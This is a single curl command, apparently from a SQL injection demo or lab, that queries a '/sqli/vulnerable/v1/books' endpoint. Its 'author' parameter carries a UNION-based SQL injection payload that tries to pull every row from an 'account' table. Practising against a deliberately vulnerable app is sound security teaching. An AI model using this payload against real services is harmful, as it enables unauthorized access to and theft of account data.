curl $URL/sqli/vulnerable/v1/books \
  --header "Content-Type: application/json" \
  --request GET \
  -G --data-urlencode "author=kelvin' UNION SELECT * FROM account --" \
  -s | jq